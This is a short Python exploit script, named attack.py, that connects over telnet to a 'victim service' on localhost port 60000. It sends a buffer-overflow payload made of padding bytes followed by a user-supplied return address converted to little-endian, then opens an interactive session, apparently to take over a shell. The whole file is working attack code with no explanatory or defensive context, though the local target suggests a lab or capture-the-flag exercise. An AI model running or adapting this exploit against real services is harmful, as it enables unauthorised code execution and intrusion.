#!/usr/bin/python3
# attack.py

import telnetlib

# Open connection to victim service
tn = telnetlib.Telnet("127.0.0.1", 60000)

# Configuration
offset = int(input("Offset (40?): "))
target_addr = input("Target (shell) address (e.g., 5647740e61b5): ")

# Create payload
buff = offset * (b'x')
addr = bytearray.fromhex(target_addr)
addr.reverse()  # Little-endian conversion
buff += addr

# Send payload
tn.write(buff)
tn.write(b'\n')

# Interactive session
tn.interact()